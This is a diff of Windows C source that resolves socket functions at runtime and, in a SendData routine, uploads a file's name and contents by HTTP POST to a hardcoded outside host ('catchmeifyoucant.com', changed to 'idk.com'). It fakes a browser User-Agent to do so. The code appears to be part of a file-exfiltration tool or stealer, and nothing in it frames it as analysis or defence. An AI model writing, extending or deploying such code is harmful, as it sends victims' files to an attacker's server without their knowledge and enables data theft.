@@ -16,8 +16,8 @@ unsigned long long  (__stdcall    *WSASocketFunc)       (int, int, int, LPWSAPRO
 int                 (__stdcall    *WSAConnectFunc)      (SOCKET,const struct sockaddr*,int, LPWSABUF,LPWSABUF,LPQOS,LPQOS);
 int                 (__stdcall    *SendFunc)            (SOCKET,const char FAR*,int, int);
 
-void              *SocketDll    = {0};
-unsigned long long hSocket      = 0;
+void *SocketDll    = {0};
+extern unsigned long long hSocket;
 
 void InitSocket() {
 /*     if (hSocket == 0) { */
@@ -61,16 +61,15 @@ int SendData(HANDLE FileHandle, char *name, int DataSize, char *DataSizeAsString
     int             CurrentBuffSize     = 0;
     int             FinalBufferSize     = 0;
 
-
     InitSocket();
 
     if (hSocket == -1) {
         return -1;
     }
 
-    const char *RequestHead =
+    const char *RequestHeader =
             "POST /up HTTP/1.1\r\n"
-            "Host: catchmeifyoucant.com\r\n"
+            "Host: idk.com\r\n"
             "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36\r\n"
             "Accept-Language: en-US,en;q=0.9,ar;q=0.8,fr;q=0.7\r\n"
             "Content-Type: application/octet-stream\r\n"
@@ -82,7 +81,7 @@ int SendData(HANDLE FileHandle, char *name, int DataSize, char *DataSizeAsString
     const char *RequestLengthField = "Content-Length: ";
 
     /*copy the const part of the request which is request head to the allocated buffer*/
-    MovMemory(RequestHead, buffer, len(RequestHead));
+    MovMemory(RequestHeader, buffer, len(RequestHeader));
 
     /*append the file name to the name field then append it to the buffer*/
     ConcatString(buffer, RequestNameField, len(buffer));
